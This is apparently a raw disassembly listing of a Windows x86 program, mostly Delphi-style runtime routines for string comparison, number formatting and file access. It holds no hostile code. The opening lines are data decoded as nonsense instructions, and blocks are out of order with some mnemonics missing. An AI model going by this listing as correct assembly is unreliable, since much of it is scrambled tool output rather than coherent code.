add [ ebp + 0x7b ] bh
inc eax
add [ ecx + 0x7b ] cl
inc eax
add [ ecx + 0x7b ] dl
inc eax
add [ ecx + 0x7b ] bl
inc eax
add [ ecx + 0x7b ] ah
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407b883f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax * 2 ] bh
movsb [ edi ] [ esi ]
jpo r-xdata
adc [ ecx + 0x48213415 ] cl
add [ ebx + 0x48353015 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add al dl
int 0x40
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34e80040 ] dl
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edi + edx * 2 + 0x40 ] ch
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ edi + edx * 2 + 0x40 ] bh
add [ edx + esi + 0x40 ] dl
stosb [ edi ]
push edx
popad
inc ebp
js r-xdata
push ebx
insb
jne r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0x21
dec eax
add [ ebx + 0x34158910 ] cl
and [ eax ] ecx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407c38
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407c54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
pop edi
pop esi
pop ebx
retn
sub_407c78
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cbc
mov eax esi
pop esi
pop ebx
retn
sub_407c98
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_407cc4
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407c98
pop ebx
retn
sub_407cfc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404334
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046c0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407d38
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404334
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046c0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407d74
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407da4
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407dc4
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407e18
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407dc4
test eax eax
jne r-xdata
sub_407e3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404334
mov ebx eax
mov eax esi
call sub_404534
mov edx eax
mov eax edi
mov ecx ebx
call sub_404164
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407e70
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404334
mov ebx eax
mov eax esi
call sub_404534
mov edx eax
mov eax edi
mov ecx ebx
call sub_404164
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
mov eax ebx
call sub_404334
push eax
mov eax ebx
call sub_404534
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407edc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
mov eax ebx
call sub_404334
push eax
mov eax ebx
call sub_404534
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f2c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407f4c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404334
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404074
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404594
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407f9c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404334
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404334
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408000
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408016
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408016
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408016
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40804c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408000
mov edx esi
pop eax
call sub_404164
add esp 0x10
pop esi
retn
sub_40806c
or cl cl
jne sub_4080a0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4080a0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4080a0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4080a0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408138
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_40806c
mov edx esi
pop eax
call sub_404164
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408160
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408000
mov edx esi
pop eax
call sub_404164
add esp 0x20
pop esi
retn
xor edx edx
sub_408188
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cdc
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407c54
sub_4081dc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cdc
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4081fc
mov eax [ rw-data ]
call sub_404e6c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404e6c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405028
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040c8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405028
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040c8
sub_40828c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407f14
test al al
je r-xdata
sub_4082c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409548
mov edx eax
test dl dl
je r-xdata
call sub_4081fc
push ebp
mov eax [ rw-data ]
call sub_404e74
mov edx eax
mov eax [ rw-data ]
call sub_40828c
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404e74
mov edx eax
mov eax [ rw-data ]
call sub_40828c
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408364
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040c8
call sub_4081fc
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040c8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040c8
jmp r-xdata
pop esi
pop ebx
retn
sub_4083b0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404534
push eax
call CreateFileA
sub_408408
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404534
push eax
call CreateFileA
pop ebx
retn
sub_408434
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408460
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40848c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4084cc
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404534
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408544
push ebx
push esi
mov esi eax
mov eax esi
call sub_404334
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bff0
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408574
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404334
mov edi eax
mov eax ebx
call sub_404534
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408878
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bff0
cmp al 0x2
jne r-xdata
dec edi
sub_4085c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408574
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404594
pop edi
pop esi
pop ebx
retn
sub_4085fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408574
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404074
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404594
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408644
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404534
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404164
add esp 0x108
pop esi
pop ebx
retn
sub_408680
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e48
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e48
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408730
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408758
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40878c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404334
push eax
mov eax ebx
call sub_404534
mov edx eax
mov eax esi
pop ecx
call sub_408758
pop esi
pop ebx
retn
sub_4087b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404534
mov edx eax
mov ecx edi
mov eax ebx
call sub_408758
pop edi
pop esi
pop ebx
retn
sub_4087d0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4087f4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408834
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40888c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408900
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4086f4
mov esi eax
inc esi
mov eax esi
call sub_4088e0
mov ecx esi
mov edx ebx
call sub_408720
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_40893c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c014
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408720
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407c54
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4089c4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408d1b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408aa6
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408aee
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408aa6
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4089b8
pop edx
or edx edx
je r-xdata
sub_408aa6
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408d1b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408aee
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408d1b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_40893c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408b15 ]
mov ebx ecx
sub cl 0x44
je sub_40806c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40429c
jmp r-xdata
mov esi sub_4042fc
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_40806c
sub cl 0x44
je sub_408000
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408000
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40806c
mov ecx 0x10
cmp bl 0x58
je sub_408000
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408994
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408ed4
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
